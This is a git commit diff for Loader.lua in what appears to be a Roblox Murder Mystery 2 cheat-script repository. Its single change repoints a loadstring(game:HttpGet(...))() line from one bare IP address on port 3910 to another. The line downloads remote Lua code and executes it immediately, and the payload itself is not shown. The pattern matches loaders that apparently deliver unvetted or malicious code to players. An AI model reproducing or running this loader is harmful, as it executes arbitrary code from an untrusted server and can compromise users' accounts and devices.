5dc7ae3475776258add3818ae164095f9bb4d4eb
mm2script-server1 <ashioargentinaacc@gmail.com>
2026-02-24 05:55:07 +0800

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6IjlhMjU1YWQ1LTIxNzEtNDRhYi1iMmYzLWIzOGQ1ZTM5ZGM1MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjlhMjU1YWQ1LTIxNzEtNDRhYi1iMmYzLWIzOGQ1ZTM5ZGM1MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJldmVudCJ9fQ"))()
